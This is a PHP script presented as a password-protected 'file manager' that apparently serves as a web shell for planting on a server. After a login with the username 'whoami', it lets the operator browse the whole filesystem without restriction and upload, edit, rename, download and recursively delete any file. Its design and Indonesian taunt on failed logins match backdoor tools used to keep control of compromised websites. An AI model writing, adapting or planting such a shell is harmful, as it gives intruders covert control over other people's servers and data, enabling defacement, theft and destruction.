<?php
$stored_hash = '$2a$12$fshHXkAtbt8nxijp7kXBLeDRIlwMzxxMMMbxCvnjSMZnrgycroPKu';
$username = 'whoami';

function verify_login($input_user, $input_pass, $stored_user, $stored_hash) {
    return ($input_user === $stored_user && password_verify($input_pass, $stored_hash));
}

session_start();
if (isset($_POST['login'])) {
    $input_user = $_POST['username'];
    $input_pass = $_POST['password'];

    if (verify_login($input_user, $input_pass, $username, $stored_hash)) {
        $_SESSION['loggedin'] = true;
    } else {
        echo "<p style='color:red;'>ngapain bro?</p>";
    }
}

if (!isset($_SESSION['loggedin'])) {
    echo '<form method="post" style="color:#E0E0E0;">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="login">Login</button>
          </form>';
    exit;
}

$root_dir = realpath(__DIR__);
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir;
}

function listDirectory($dir) {
    $files = scandir($dir);
    $directories = [];
    $regular_files = [];

    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;
            } else {
                $regular_files[] = $file;
            }
        }
    }

    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . $directory . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>' . date("Y-m-d H:i:s", filemtime($dir . '/' . $directory)) . '</td>'; // Menampilkan waktu terakhir diubah
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . $file . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>' . date("Y-m-d H:i:s", filemtime($dir . '/' . $file)) . '</td>'; // Menampilkan waktu terakhir diubah
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

if (isset($_GET['delete'])) {
    $item_to_delete = $current_dir . '/' . $_GET['delete'];

    if (is_file($item_to_delete)) {
        unlink($item_to_delete);
    } elseif (is_dir($item_to_delete)) {
        function deleteDir($dir) {
            $files = array_diff(scandir($dir), array('.', '..'));
            foreach ($files as $file) {
                $filePath = "$dir/$file";
                if (is_dir($filePath)) {
                    deleteDir($filePath);
                } else {
                    unlink($filePath);
                }
            }
            rmdir($dir);
        }
        deleteDir($item_to_delete);
    }

    header("Location: ?dir=" . urlencode($_GET['dir']));
    exit;
}

if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

if (isset($_POST['save_edit'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

if (isset($_GET['edit'])) {
    $file_to_edit = $current_dir . '/' . $_GET['edit'];
    if (is_file($file_to_edit)) {
        $file_content = file_get_contents($file_to_edit);
    }
}

if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

if (isset($_POST['create_folder'])) {
    $new_folder_name = $_POST['new_folder_name'];
    $new_folder_path = $current_dir . '/' . $new_folder_name;
    mkdir($new_folder_path);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

if (isset($_GET['rename'])) {
    $rename_item = $_GET['rename'];
    echo '<h2>Rename: ' . htmlspecialchars($rename_item) . '</h2>';
    echo '<form method="post">
            <input type="hidden" name="old_name" value="' . htmlspecialchars($rename_item) . '">
            <input type="text" name="new_name" placeholder="New Name" required>
            <button type="submit" name="rename_file">Rename</button>
          </form>';
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>file manager</title>
    <style>
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #qBB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 5px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo $current_dir; ?></a></p>
    
    <div class="form-container">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <form method="post">
            <input type="text" name="new_file_name" placeholder="New File Name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>

        <form method="post">
            <input type="text" name="new_folder_name" placeholder="New Folder Name" required>
            <button type="submit" name="create_folder">Create Folder</button>
        </form>
    </div>

    <?php if (isset($_GET['edit']) && is_file($file_to_edit)) : ?>
        <h2>Edit File: <?php echo htmlspecialchars($_GET['edit']); ?></h2>
        <form method="post">
            <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
            <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
            <button type="submit" name="save_edit">Save</button>
        </form>
    <?php endif; ?>

    <table>
        <thead>
            <tr>
                <th>File/Folder</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>
</body>
</html>
